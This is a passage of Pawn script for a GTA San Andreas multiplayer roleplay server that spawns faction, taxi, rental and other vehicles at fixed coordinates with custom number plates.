	CopSFVeh[8] = AddStaticVehicle(522,-1573.549316,705.562255,-5.678458,86.143150,0,1);//Vehid:879 Title:NRGSF
	CopSFVeh[9] = AddStaticVehicle(522,-1572.985717,710.313293,-5.672243,89.751358,0,1);//Vehid:842 Title:NRGSF
	CopSFVeh[10] = AddStaticVehicle(522,-1608.374511,749.418579,-5.670326,182.654800,0,1);//Vehid:880 Title:NRGSF
	CopSFVeh[11] = AddStaticVehicle(522,-1634.479858,652.000488,6.751546,0.564142,0,1);//Vehid:883 Title:NRGSF
	CopSFVeh[12] = AddStaticVehicle(522,-1628.485473,651.890380,6.750324,0.514040,0,1);//Vehid:882 Title:NRGSF
	CopSFVeh[13] = AddStaticVehicle(522,-1592.189819,673.438537,6.742340,180.476730,0,1);//Vehid:877 Title:NRGSF
	CopSFVeh[14] = AddStaticVehicle(522,-1595.497314,673.324951,6.755851,181.885711,0,1);//Vehid:869 Title:NRGSF
	CopSFVeh[15] = AddStaticVehicle(425,-1592.906860,703.761779,49.483318,181.636001,0,0);//Vehid:882 Title:HunterSFPD
	CopSFVeh[16] = AddStaticVehicle(497,-1616.932983,703.905029,49.094379,179.562561,16,1);//Vehid:883 Title:MaverickSFPD
	CopSFVeh[17] = AddStaticVehicle(497,-1632.818725,693.917663,49.092922,273.647521,16,1);//Vehid:884 Title:MaverickSFPD
	CopSFVeh[18] = AddStaticVehicle(497,-1680.005004,705.602905,30.783691,90.223724,16,1);//Vehid:885 Title:MaverickSFPD
	CopSFVeh[19] = AddStaticVehicle(601,-1623.595336,649.596801,-5.475987,89.777000,2,2);//Vehid:846 Title:SwatSF
	CopSFVeh[20] = AddStaticVehicle(601,-1638.437011,649.544311,-5.476097,270.458374,2,2);//Vehid:841 Title:SwatSF
	CopSFVeh[21] = AddStaticVehicle(601,-1638.380126,657.857788,-5.479079,269.845184,2,2);//Vehid:847 Title:SwatSF
	CopSFVeh[22] = AddStaticVehicle(601,-1599.935546,749.231750,-5.483370,180.631195,2,2);//Vehid:848 Title:SwatSF
	CopSFVeh[23] = AddStaticVehicle(601,-1587.818847,749.290832,-5.520294,177.217285,2,2);//Vehid:844 Title:SwatSF
	CopSFVeh[24] = AddStaticVehicle(601,-1600.386596,673.072937,6.946304,180.820922,2,2);//Vehid:845 Title:SwatSF
	CopSFVeh[25] = AddStaticVehicle(427,-1638.661987,666.095886,-5.110519,270.421020,0,1);//Vehid:852 Title:EnforcerSF
	CopSFVeh[26] = AddStaticVehicle(427,-1620.545776,692.006774,-5.086835,179.171951,0,1);//Vehid:851 Title:EnforcerSF
	CopSFVeh[27] = AddStaticVehicle(427,-1612.570800,733.071899,-5.101982,1.927321,0,1);//Vehid:849 Title:EnforcerSF
	CopSFVeh[28] = AddStaticVehicle(427,-1622.727905,652.261413,7.320430,358.766540,0,1);//Vehid:850 Title:EnforcerSF
	CopSFVeh[29] = AddStaticVehicle(427,-1606.277954,673.207214,7.319390,180.396652,0,1);//Vehid:853 Title:EnforcerSF
	CopSFVeh[30] = AddStaticVehicle(427,-1587.875366,673.060791,7.326933,180.431610,0,1);//Vehid:868 Title:EnforcerSF
	CopSFVeh[31] = AddStaticVehicle(597,-1587.879516,652.291992,6.941409,359.386749,16,1);//Vehid:854 Title:SFPD
	CopSFVeh[32] = AddStaticVehicle(597,-1612.197265,673.359985,6.959559,174.521514,16,1);//Vehid:856 Title:SFPD
	CopSFVeh[33] = AddStaticVehicle(597,-1573.557739,738.839843,-5.493996,91.046150,16,1);//Vehid:860 Title:SFPD
	CopSFVeh[34] = AddStaticVehicle(597,-1573.277465,731.144653,-5.457022,93.866928,16,1);//Vehid:857 Title:SFPD
	CopSFVeh[35] = AddStaticVehicle(597,-1613.073242,693.269287,-5.455945,178.940292,16,1);//Vehid:855 Title:SFPD
	CopSFVeh[36] = AddStaticVehicle(597,-1608.543945,693.027343,-5.498574,177.708343,16,1);//Vehid:858 Title:SFPD
	CopSFVeh[37] = AddStaticVehicle(528,-1592.249755,749.241516,-5.184579,180.237396,0,1);//Vehid:888 Title:TruckFSF
	CopSFVeh[38] = AddStaticVehicle(528,-1574.247802,718.157592,-5.184595,90.703178,0,1);//Vehid:886 Title:TruckFSF
	CopSFVeh[39] = AddStaticVehicle(528,-1604.622314,692.933654,-5.184577,178.209625,0,1);//Vehid:887 Title:TruckFSF
	CopSFVeh[40] = AddStaticVehicle(599,-1595.958618,676.444335,-5.103035,0.439708,0,1);//Vehid:892 Title:RangerSF
	CopSFVeh[41] = AddStaticVehicle(599,-1573.740356,722.500793,-5.104045,89.222625,0,1);//Vehid:893 Title:RangerSF
	CopSFVeh[42] = AddStaticVehicle(599,-1580.104736,749.109802,-5.112963,177.960937,0,1);//Vehid:891 Title:RangerSF
	CopSFVeh[43] = AddStaticVehicle(490,-1584.016357,749.072509,-5.153203,180.201278,0,1);//Vehid:890 Title:RancherFSF
	CopSFVeh[44] = AddStaticVehicle(490,-1573.136840,713.930847,-5.151961,91.565826,0,0);//Vehid:889 Title:RancherFSF
	CopSFVeh[45] = AddStaticVehicle(523,-1588.594360,711.371459,-5.696097,269.422149,0,0);//Vehid:866 Title:HPVSF
	CopSFVeh[46] = AddStaticVehicle(523,-1588.497192,707.871826,-5.664343,265.126983,0,0);//Vehid:861 Title:HPVSF
	CopSFVeh[47] = AddStaticVehicle(523,-1588.802124,704.794006,-5.667381,265.114440,0,0);//Vehid:867 Title:HPVSF
	CopSFVeh[48] = AddStaticVehicle(523,-1616.294311,650.890319,6.750106,2.675098,0,0);//Vehid:865 Title:HPVSF
	CopSFVeh[49] = AddStaticVehicle(523,-1610.614257,651.249694,6.749091,2.411076,0,0);//Vehid:859 Title:HPVSF
	CopSFVeh[50] = AddStaticVehicle(523,-1605.109375,651.472900,6.749954,0.573735,0,0);//Vehid:864 Title:HPVSF
	CopSFVeh[51] = AddStaticVehicle(523,-1599.401855,651.777648,6.722520,357.607818,0,0);//Vehid:863 Title:HPVSF
	CopSFVeh[52] = AddStaticVehicle(523,-1593.910522,651.500305,6.752467,359.705902,0,0);//Vehid:862 Title:HPVSF
    //--------------------------------------------------------------------------FBI
    FBIVeh[0] = AddStaticVehicleEx(497,2315.28369141,2452.77416992,11.08531284,182.00000000,0,1,900); SetVehicleNumberPlate(FBIVeh[0], "FBI 001"); //Police Maverick FBI LV 39
    FBIVeh[1] = AddStaticVehicleEx(598,2273.60009766,2443.59155273,10.69031239,0.00000000,0,1,900); SetVehicleNumberPlate(FBIVeh[1], "FBI 002"); //Police Car (LVPD) FBI LV 40
    FBIVeh[2] = AddStaticVehicleEx(598,2256.00000000,2476.75341797,10.69031239,180.00000000,0,1,900); SetVehicleNumberPlate(FBIVeh[2], "FBI 003"); //Police Car (LVPD) FBI LV 41
    FBIVeh[3] = AddStaticVehicleEx(598,2277.76660156,2477.46215820,11.00531197,180.00000000,0,1,900); SetVehicleNumberPlate(FBIVeh[3], "FBI 004"); //FBI Truck FBI LV 42
    FBIVeh[4] = AddStaticVehicleEx(490,2256.11889648,2442.89990234,11.14043903,0.00000000,0,0,900); SetVehicleNumberPlate(FBIVeh[4], "FBI 005"); //FBI Rancher FBI LV 43
    FBIVeh[5] = AddStaticVehicleEx(490,2314.77197266,2490.27026367,3.59356403,90.00000000,0,0,900); SetVehicleNumberPlate(FBIVeh[5], "FBI 006"); //FBI Rancher FBI LV 44
    FBIVeh[6] = AddStaticVehicleEx(598,2294.62231445,2430.85986328,3.45843744,0.00000000,0,1,900); SetVehicleNumberPlate(FBIVeh[6], "FBI 007"); //FBI Truck FBI LV 45
    FBIVeh[7] = AddStaticVehicleEx(598,2268.38378906,2431.40649414,3.52143764,0.00000000,0,1,900); SetVehicleNumberPlate(FBIVeh[7], "FBI 008"); //Enforcer FBI LV 46
    FBIVeh[8] = AddStaticVehicleEx(598,2240.64038086,2466.12719727,3.52143764,270.00000000,0,1,900); SetVehicleNumberPlate(FBIVeh[8], "FBI 009"); //Enforcer FBI LV 47
    FBIVeh[9] = AddStaticVehicleEx(598,2277.00366211,2474.64453125,3.45843744,0.00000000,0,1,900); SetVehicleNumberPlate(FBIVeh[9], "FBI 010"); //FBI Truck FBI LV 48
    FBIVeh[10] = AddStaticVehicleEx(490,2314.48754883,2460.38500977,3.59356403,90.00000000,0,0,900); SetVehicleNumberPlate(FBIVeh[10], "FBI 011"); //FBI Rancher FBI LV 49
    FBIVeh[11] = AddStaticVehicleEx(522,2281.00366211,2431.39282227,10.48069000,222.00000000,0,1,900); SetVehicleNumberPlate(FBIVeh[11], "FBI 012"); //FCR-900 FBI LV 50
    FBIVeh[12] = AddStaticVehicleEx(522,2299.62451172,2431.67456055,10.48069000,135.99523926,0,1,900); SetVehicleNumberPlate(FBIVeh[12], "FBI 013"); //FCR-900 FBI LV 51
    FBIVeh[13] = AddStaticVehicleEx(541,2282.54956055,2418.89257812,10.62528801,270.00000000,1,1,900); SetVehicleNumberPlate(FBIVeh[13],"FBI 014");
    FBIVeh[14] = AddStaticVehicleEx(541,2303.06958008,2418.88232422,10.62528801,270.00000000,1,1,900); SetVehicleNumberPlate(FBIVeh[14],"FBI 015");
    /*----------------------------------------------------------------------------*///
    MedVeh[0] = AddStaticVehicleEx(416,1179.00000000,-1339.03942871,13.87588120,268.00000000,1,3,900); SetVehicleNumberPlate(MedVeh[0], "MED 001");
    MedVeh[1] = AddStaticVehicleEx(416,1179.00000000,-1308.55395508,13.87588120,267.99499512,1,3,900); SetVehicleNumberPlate(MedVeh[1], "MED 002");
    MedVeh[2] = AddStaticVehicleEx(407,1750.71472168,2077.48583984,11.19031239,179.99993896,3,1,900); SetVehicleNumberPlate(MedVeh[2], "MED 003");
    MedVeh[3] = AddStaticVehicleEx(407,1763.40002441,2077.48535156,11.19031239,179.99450684,3,1,900); SetVehicleNumberPlate(MedVeh[3], "MED 004");
    MedVeh[4] = AddStaticVehicleEx(416,1583.71789551,1807.50390625,11.11988831,0.00000000,1,3,900); SetVehicleNumberPlate(MedVeh[4], "MED 005");
    MedVeh[5] = AddStaticVehicleEx(416,1624.01892090,1819.05505371,11.11988831,4.00000000,1,3,900); SetVehicleNumberPlate(MedVeh[5], "MED 006");
    MedVeh[6] = AddStaticVehicleEx(599,1592.451800,1818.595200000,11.017900000,0.000000,3,1,900); SetVehicleNumberPlate(MedVeh[6], "MED 007")
    MedVeh[7] = AddStaticVehicleEx(416,1579.83215332,1752.59997559,11.11988831,0.00000000,1,3,900); SetVehicleNumberPlate(MedVeh[7], "MED 008");
    MedVeh[8] = AddStaticVehicleEx(416,1579.83276367,1774.25488281,11.11988831,180.00000000,1,3,900); SetVehicleNumberPlate(MedVeh[8], "MED 009");
    MedVeh[9] = AddStaticVehicleEx(563,1607.58959961,1800.33703613,30.73374939,0.00000000,1,3,900); SetVehicleNumberPlate(MedVeh[9], "MED 010");
	MedVeh[10] = AddStaticVehicleEx(416, -2649.2349, 625.9334, 14.2127, -183.7200, -1, -1, 100); SetVehicleNumberPlate(MedVeh[10], "MED 011");
	MedVeh[11] = AddStaticVehicleEx(416, -2653.1826, 626.3715, 13.4354, -181.0200, -1, -1, 100); SetVehicleNumberPlate(MedVeh[11], "MED 012");
    /*----------------------------------------------------------------------------*///
    HitVeh[0] = AddStaticVehicleEx(487,1086.4642330,-292.4785,74.257189,138.0000,0,0,900); SetVehicleNumberPlate(HitVeh[0], "HIT 001");
    HitVeh[1] = AddStaticVehicleEx(402,1077.50000,-294.409963,73.925046,180.00000,0,0,900); SetVehicleNumberPlate(HitVeh[1], "HIT 002");
    HitVeh[2] = AddStaticVehicleEx(402,1067.360356,-294.409169,73.925046,180.00000,0,0,900); SetVehicleNumberPlate(HitVeh[2], "HIT 003");
    HitVeh[3] = AddStaticVehicleEx(402,1072.39941406,-294.40969,73.92546,180.00000,0,0,900); SetVehicleNumberPlate(HitVeh[3], "HIT 004");
    HitVeh[4] = AddStaticVehicleEx(521, 1058.4840, -288.6451, 73.4780, 180.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[4],"HIT 005");
    HitVeh[5] = AddStaticVehicleEx(521, 1057.6240, -288.6451, 73.4780, 180.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[5],"HIT 006");
    HitVeh[6] = AddStaticVehicleEx(521, 1059.3240, -288.6451, 73.4780, 180.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[6],"HIT 007");
    HitVeh[7] = AddStaticVehicleEx(522, 1060.1644, -288.6451, 73.4780, 180.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[7],"HIT 008");
    HitVeh[8] = AddStaticVehicleEx(522, 1056.8044, -288.6451, 73.4780, 180.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[8],"HIT 009");
    HitVeh[9] = AddStaticVehicleEx(522, 1058.4840, -291.0451, 73.4780, 180.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[9],"HIT 010");
    HitVeh[10] = AddStaticVehicleEx(487, 1088.9355, -338.6948, 74.0705, 90.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[10],"HIT 011");
    HitVeh[11] = AddStaticVehicleEx(560, 1049.1427, -298.1856, 73.5605, 180.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[11],"HIT 012");
    HitVeh[12] = AddStaticVehicleEx(560, 1045.7627, -298.1856, 73.5605, 180.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[12],"HIT 013");
    HitVeh[13] = AddStaticVehicleEx(560, 1042.6227, -298.1856, 73.5605, 180.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[13],"HIT 014");
    HitVeh[14] = AddStaticVehicleEx(579, 1019.1374, -301.4247, 73.8912, 180.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[14],"HIT 015");
    HitVeh[15] = AddStaticVehicleEx(579, 1014.9774, -301.4247, 73.8912, 180.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[15],"HIT 016");
    HitVeh[16] = AddStaticVehicleEx(579, 1023.2574, -301.4247, 73.8912, 180.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[16],"HIT 017");
    HitVeh[17] = AddStaticVehicleEx(469, 1020.5518, -328.1164, 73.8909, -90.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[17],"HIT 018");
    HitVeh[18] = AddStaticVehicleEx(469, 1020.5518, -339.4964, 73.8909, -90.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[18],"HIT 019");
    HitVeh[19] = AddStaticVehicleEx(602, 1081.8064, -339.6473, 73.7429, 0.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[19],"HIT 020");
    HitVeh[20] = AddStaticVehicleEx(602, 1077.5264, -339.6473, 73.7429, 0.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[20],"HIT 021");
    HitVeh[21] = AddStaticVehicleEx(477, 1066.8530, -340.9846, 73.6908, 0.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[21],"HIT 022");
    HitVeh[22] = AddStaticVehicleEx(477, 1062.7130, -340.9846, 73.6908, 0.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[22],"HIT 023");
    HitVeh[23] = AddStaticVehicleEx(477, 1058.7130, -340.9846, 73.6908, 0.0000, 0, 0, 1000); SetVehicleNumberPlate(HitVeh[23],"HIT 024");
    /*----------------------------------------------------------------------------*///
    TaxVeh[0] = AddStaticVehicleEx(420,1806.83483887,-1927.15808105,13.23526382,0.00000000,6,-1,900); SetVehicleNumberPlate(TaxVeh[0], "TAXI 001");
    TaxVeh[1] = AddStaticVehicleEx(420,1780.05847168,-1932.61279297,13.23699188,0.00000000,6,1,900); SetVehicleNumberPlate(TaxVeh[1], "TAXI 002");
    TaxVeh[2] = AddStaticVehicleEx(420,1801.83264160,-1932.48669434,13.23699188,0.00000000,6,1,900); SetVehicleNumberPlate(TaxVeh[2], "TAXI 003");
    TaxVeh[3] = AddStaticVehicleEx(420,1807.03100586,-1906.13208008,13.23526382,0.00000000,6,-1,900); SetVehicleNumberPlate(TaxVeh[3], "TAXI 004");
    TaxVeh[4] = AddStaticVehicleEx(420,951.81646729,1708.90002441,8.49843693,270.00000000,6,1,900); SetVehicleNumberPlate(TaxVeh[4], "TAXI 005");
    TaxVeh[5] = AddStaticVehicleEx(420,951.81640625,1757.69995117,8.49843693,270.00000000,6,1,900); SetVehicleNumberPlate(TaxVeh[5], "TAXI 006");
    TaxVeh[6] = AddStaticVehicleEx(420,951.81640625,1748.90002441,8.49843693,270.00000000,6,1,900); SetVehicleNumberPlate(TaxVeh[6], "TAXI 007");
    TaxVeh[7] = AddStaticVehicleEx(420,951.81640625,1717.69921875,8.49843693,270.00000000,6,1,900); SetVehicleNumberPlate(TaxVeh[7], "TAXI 008");
    TaxVeh[8] = AddStaticVehicleEx(438,1799.3512, -1885.8828, 13.2803, 270.0000,6,6,900); SetVehicleNumberPlate(TaxVeh[8], "TAXI 009");
    TaxVeh[9] = AddStaticVehicleEx(438,1781.3384, -1886.0508, 13.2803, 270.0000,6,6,900); SetVehicleNumberPlate(TaxVeh[9], "TAXI 010");
    TaxVeh[10] = AddStaticVehicleEx(560,1774.46984863,-1927.15917969,13.23526382,0.00000000,6,-1,900); SetVehicleNumberPlate(TaxVeh[10], "TAXI 011");
    TaxVeh[11] = AddStaticVehicleEx(560,1774.46362305,-1906.14965820,13.23526382,0.00000000,6,-1,900); SetVehicleNumberPlate(TaxVeh[11], "TAXI 012");
    TaxVeh[12] = AddStaticVehicleEx(487,945.21612549,1796.00000000,16.05909538,270.00000000,6,-1,900); SetVehicleNumberPlate(TaxVeh[12], "TAXI 013");
    TaxVeh[13] = AddStaticVehicleEx(487,945.21582031,1671.47363281,16.05909538,270.00000000,6,-1,900); SetVehicleNumberPlate(TaxVeh[13], "TAXI 014");
    TaxVeh[14] = AddStaticVehicleEx(420,984.33563232,1743.44055176,8.49843693,92.00000000,6,1,900); SetVehicleNumberPlate(TaxVeh[14], "TAXI 015");
    TaxVeh[15] = AddStaticVehicleEx(420,984.26385498,1722.80004883,8.50487614,91.99951172,6,1,900); SetVehicleNumberPlate(TaxVeh[15], "TAXI 016");
    TaxVeh[16] = AddStaticVehicleEx(420,984.33496094,1733.09997559,8.49843693,91.99951172,6,1,900); SetVehicleNumberPlate(TaxVeh[16], "TAXI 017");
	TaxVeh[17] = AddStaticVehicleEx(560,951.17291260,1740.40563965,8.45341301,270.00000000,6,1,900); SetVehicleNumberPlate(TaxVeh[17], "TAXI 018");
    TaxVeh[18] = AddStaticVehicleEx(560,951.16918945,1726.22033691,8.45341301,270.00000000,6,1,900); SetVehicleNumberPlate(TaxVeh[18], "TAXI 019");
    /*----------------------------------------------------------------------------*///
    MCHVeh[0] = AddStaticVehicle(525,1626.87280273,2197.60156250,10.81031227,179.99993896,-1,3); SetVehicleNumberPlate(MCHVeh[0], "MCH 001");
    MCHVeh[1] = AddStaticVehicle(525,1638.00000000,2197.60156250,10.81031227,179.99450684,-1,3); SetVehicleNumberPlate(MCHVeh[1], "MCH 002");
    MCHVeh[2] = AddStaticVehicle(525,1649.30004883,2197.60156250,10.81031227,179.99450684,-1,3); SetVehicleNumberPlate(MCHVeh[2], "MCH 003");
    /*----------------------------------------------------------------------------*///
    SetVehicleNumberPlate(AddStaticVehicleEx(571,2286.2141,-2354.5000,12.8306,225.8705,-1,-1,900), "Kart 001"); // kart 90
    SetVehicleNumberPlate(AddStaticVehicleEx(571,2279.9412,-2348.4141,12.8312,225.8585,-1,-1,900), "Kart 002"); // kart 91
    SetVehicleNumberPlate(AddStaticVehicleEx(571,2291.7932,-2345.5356,12.8305,227.3060,-1,-1,900), "Kart 003"); // kart 92
    SetVehicleNumberPlate(AddStaticVehicleEx(571,2287.5615,-2341.6433,12.8306,226.5350,-1,-1,900), "Kart 004"); // kart 93
    SetVehicleNumberPlate(AddStaticVehicleEx(571,2299.6785,-2338.3186,12.8307,224.3563,-1,-1,900), "Kart 005"); // kart 94
    SetVehicleNumberPlate(AddStaticVehicleEx(571,2295.3887,-2334.9448,12.8307,227.9102,-1,-1,900), "Kart 006"); // kart 95
    /*----------------------------------------------------------------------------*///
    ProdsVeh[0] = AddStaticVehicle(456,2508.9116,-2111.7759,13.7206,0,-1,-1); // Component Truck Yankee 98
    ProdsVeh[1] = AddStaticVehicle(456,2484.5356,-2111.7759,13.7196,0,-1,-1); // Component Truck Yankee 99
    ProdsVeh[2] = AddStaticVehicle(440,2529.0413,-2085.3999,13.6651,90,-1,-1); // Component Truck Rumpo 100
    ProdsVeh[3] = AddStaticVehicle(440,2528.9482,-2092.6104,13.6631,90,-1,-1); // Component Truck Rumpo 101
    /*----------------------------------------------------------------------------*///
	SLVeh[0] =  AddStaticVehicle(560,1147.38305664,1368.28906250,10.67187500,270.00000000,162,162); SetVehicleNumberPlate(SLVeh[0], "SL 001");
	SLVeh[1] = AddStaticVehicle(560,1133.09558105,1368.39843750,10.67187500,270.00000000,162,162); SetVehicleNumberPlate(SLVeh[1], "SL 002");
	SLVeh[2] = AddStaticVehicle(560,1142.16845703,1378.60693359,10.67187500,270.00000000,162,162); SetVehicleNumberPlate(SLVeh[2], "SL 003");
    SLVeh[3] = AddStaticVehicle(487,365.33956909,2538.09204102,16.92982101,181.99993896,162,162); SetVehicleNumberPlate(SLVeh[3], "SL 004");
    SLVeh[4] = AddStaticVehicle(593,351.16583252,2537.30957031,17.36808968,180.00000000,162,162); SetVehicleNumberPlate(SLVeh[4], "SL 005");
    SLVeh[5] = AddStaticVehicle(513,380.02499390,2536.27026367,17.32382011,180.00000000,162,162); SetVehicleNumberPlate(SLVeh[5], "SL 006");
    /*----------------------------------------------------------------------------*///
    AddStaticVehicleEx(556,-2325.78515625,-1674.27185059,482.81427002,328.00000000,-1,-1,900); //Bandito 125 LS CaRsS Chilliand
    AddStaticVehicleEx(468,-2328.04980469,-1671.36511230,482.79415894,330.00000000,-1,-1,900); //Sanchez 126 LS CaRsS Chilliand
    AddStaticVehicleEx(468,-2329.97143555,-1669.74450684,482.79415894,329.99633789,-1,-1,900); //Sanchez 127 LS CaRsS Chilliand
    AddStaticVehicleEx(468,-2332.36987305,-1667.49414062,482.79415894,329.99633789,-1,-1,900); //Sanchez 128 LS CaRsS Chilliand
    AddStaticVehicleEx(468,-2334.37768555,-1665.51074219,482.79415894,329.99633789,-1,-1,900); //Sanchez 129 LS CaRsS Chilliand
    AddStaticVehicleEx(471,-2261.19262695,-1690.35693359,480.27966309,145.99993896,-1,-1,900); //Quad 130 LS CaRsS Chilliand
    AddStaticVehicleEx(471,-2259.52026367,-1691.86157227,480.27966309,145.99731445,-1,-1,900); //Quad 131 LS CaRsS Chilliand
    AddStaticVehicleEx(471,-2257.66162109,-1693.53369141,480.27966309,145.99731445,-1,-1,900); //Quad 132 LS CaRsS Chilliand
    AddStaticVehicleEx(471,-2255.80322266,-1695.20556641,480.27966309,145.99731445,-1,-1,900); //Quad 133 LS CaRsS Chilliand
    AddStaticVehicleEx(471,-2253.94482422,-1696.87744141,480.27966309,145.99731445,-1,-1,900); //Quad 134 LS CaRsS Chilliand
    AddStaticVehicleEx(471,-2251.71484375,-1698.88378906,480.27966309,145.99731445,-1,-1,900); //Quad 135 LS CaRsS Chilliand
    /*----------------------------------------------------------------------------*///
    RentVeh[0] = AddStaticVehicleEx(436,2129.6118,1408.3391,10.4977,0.0933,-1,-1,900); SetVehicleNumberPlate(RentVeh[0], "Rent");//Rent car LV Banshee 140
    RentVeh[1] = AddStaticVehicleEx(496,2148.8013,1408.3439,10.5979,358.7675,-1,-1,900); SetVehicleNumberPlate(RentVeh[1], "Rent");//Rent car LV Zr-350 141
    RentVeh[2] = AddStaticVehicleEx(507,2142.3154,1398.6925,10.7710,179.4777,-1,-1,900); SetVehicleNumberPlate(RentVeh[2], "Rent");//Rent car LV Hotckife 142
    RentVeh[3] = AddStaticVehicleEx(516,2123.0991,1398.7360,10.6198,179.7413,-1,-1,900); SetVehicleNumberPlate(RentVeh[3], "Rent");//Rent car LV Cheetah  143
    RentVeh[4] = AddStaticVehicleEx(517,2110.3821,1408.2379,10.5631,359.7492,-1,-1,900); SetVehicleNumberPlate(RentVeh[4], "Rent");//Rent car LV Super GT 144
    RentVeh[5] = AddStaticVehicleEx(526,2100.7273,1398.9619,10.9282,179.6969,-1,-1,900); SetVehicleNumberPlate(RentVeh[5], "Rent");//Rent car LV Mesa 145
    RentVeh[6] = AddStaticVehicleEx(527,2119.9829,1408.3014,10.5889,0.4287,-1,-1,900); SetVehicleNumberPlate(RentVeh[6], "Rent");//Rent car LS Vrigo 146
    RentVeh[7] = AddStaticVehicleEx(529,2139.1919,1408.0792,10.6108,0.4416,-1,-1,900); SetVehicleNumberPlate(RentVeh[7], "Rent");//Rent car LS Comet 147
    RentVeh[8] = AddStaticVehicleEx(522,1832.4215,-1872.1449,12.9827,354.8399,13,13,900); SetVehicleNumberPlate(RentVeh[8], "Rent"); // Faggio 102 rent
    RentVeh[9] = AddStaticVehicleEx(522,1837.8413,-1872.3580,12.9884,356.1614,1,3,900); SetVehicleNumberPlate(RentVeh[9], "Rent"); // Faggio 104 rent
    RentVeh[10] = AddStaticVehicleEx(522,1844.4570,-1872.6265,12.9903,356.8652,2,1,900);SetVehicleNumberPlate(RentVeh[10], "Rent"); // Faggio 106 rent
    RentVeh[11] = AddStaticVehicleEx(462,1842.1145,-1853.9072,12.9798,180.3110,1,1,900); SetVehicleNumberPlate(RentVeh[11], "Rent"); // Faggio 107 rent
    RentVeh[12] = AddStaticVehicleEx(463,1261.0498,-1794.9246,12.9855,184.2259,0,0,900);SetVehicleNumberPlate(RentVeh[12], "Rent"); // Freeway 108 rent
    RentVeh[13] = AddStaticVehicleEx(463,1263.1216,-1794.9773,12.9821,180.7151,0,0,900);SetVehicleNumberPlate(RentVeh[13], "Rent"); // Freeway 109 rent
    RentVeh[14] = AddStaticVehicleEx(463,1834.2683,-1853.3597,12.9893,179.0098,0,0,900); SetVehicleNumberPlate(RentVeh[14], "Rent"); // Freeway 110 rent
    RentVeh[15] = AddStaticVehicleEx(436,2129.6118,1408.3391,10.4977,0.0933,-1,-1,900); SetVehicleNumberPlate(RentVeh[15], "Rent"); //Banshee RentCar LS 117
    RentVeh[16] = AddStaticVehicleEx(496,2148.8013,1408.3439,10.5979,358.7675,-1,-1,900); SetVehicleNumberPlate(RentVeh[16], "Rent"); //ZR-350 RentCar LS 118
    RentVeh[17] = AddStaticVehicleEx(541, 1243.5386, -1833.0105, 12.8263, 0.5400, -1, -1,900); SetVehicleNumberPlate(RentVeh[17], "Rent"); //Cheetah RentCar LS 119
    RentVeh[18] = AddStaticVehicleEx(410,542.52355957,-1288.85302734,17.03430176,0.00000000,1,1,900); SetVehicleNumberPlate(RentVeh[18], "Rent"); //Super GT RentCar LS 120
    RentVeh[19] = AddStaticVehicleEx(451, 1235.6830, -1832.9548, 12.8448, -3.4200, -1, -1,900); SetVehicleNumberPlate(RentVeh[19], "Rent"); //Mesa RentCar LS 121
    RentVeh[20] = AddStaticVehicleEx(526, 2100.7273 , 1398.9619,10.9282 , 179.6969 ,-1,-1,900); SetVehicleNumberPlate(RentVeh[20], "Rent"); //Hotknife RentCar LS 122
    RentVeh[21] = AddStaticVehicleEx(480, 1198.4347, -1826.7568, 12.9376, -92.8200,-1,-1,900); SetVehicleNumberPlate(RentVeh[21], "Rent"); //Comet RentCar LS 123
    RentVeh[22] = AddStaticVehicleEx(477, 1198.9615, -1835.4865, 12.9971, -87.8400, -1, -1, 900); SetVehicleNumberPlate(RentVeh[22], "Rent"); //Virgo RentCar LS 124
    RentVeh[23] = AddStaticVehicleEx(560, 1258.5371, -1832.8959, 12.8754, -1.5000, -1, -1, 900); SetVehicleNumberPlate(RentVeh[23], "Rent"); //Virgo RentCar LS 124
    RentVeh[24] = AddStaticVehicleEx(452,1637.15246582,593.97656250,0.00000000,180.00000000,-1,-1,900); SetVehicleNumberPlate(RentVeh[24], "Rent"); //Virgo RentCar LS 124
    RentVeh[25] = AddStaticVehicleEx(473,1619.58081055,579.31976318,0.00000000,180.00000000,-1,-1,900); SetVehicleNumberPlate(RentVeh[25], "Rent"); //Virgo RentCar LS 124
    RentVeh[26] = AddStaticVehicleEx(473,1636.83007812,579.09613037,0.00000000,180.00000000,-1,-1,900); SetVehicleNumberPlate(RentVeh[26], "Rent"); //Virgo RentCar LS 124
    RentVeh[27] = AddStaticVehicleEx(493,1624.63061523,569.87823486,0.00000000,180.00000000,-1,-1,900); SetVehicleNumberPlate(RentVeh[27], "Rent"); //Virgo RentCar LS 124
    RentVeh[28] = AddStaticVehicleEx(493,1632.12988281,569.87609863,0.00000000,180.00000000,-1,-1,900); SetVehicleNumberPlate(RentVeh[28], "Rent"); //Virgo RentCar LS 124
    	AddStaticVehicleEx(510, 1237.0562, -1815.3619, 12.9787, -91.0200, -1, -1, 100);
	AddStaticVehicleEx(510, 1237.0476, -1816.1089, 12.9787, -91.0200, -1, -1, 100);
	AddStaticVehicleEx(510, 1237.0406, -1813.9369, 12.9787, -91.0200, -1, -1, 100);
	AddStaticVehicleEx(510, 1237.0503, -1813.2368, 12.9787, -91.0200, -1, -1, 100);
	AddStaticVehicleEx(510, 1237.0573, -1816.9261, 12.9787, -91.0200, -1, -1, 100);
	AddStaticVehicleEx(510, 1237.1084, -1817.6482, 12.9787, -91.0200, -1, -1, 100);
    /*----------------------------------------------------------------------------*///
    MayorVeh = AddStaticVehicle(421, 1482.3547, -1736.1621, 13.2465, 270.2103,28,1); SetVehicleNumberPlate(MayorVeh, "MAYOR");
    AddStaticVehicleEx(550, 1616.7512, -1137.0022, 23.7013, 269.1846, -1, -1, 1200);// added by eblis (sunrise parking ls)
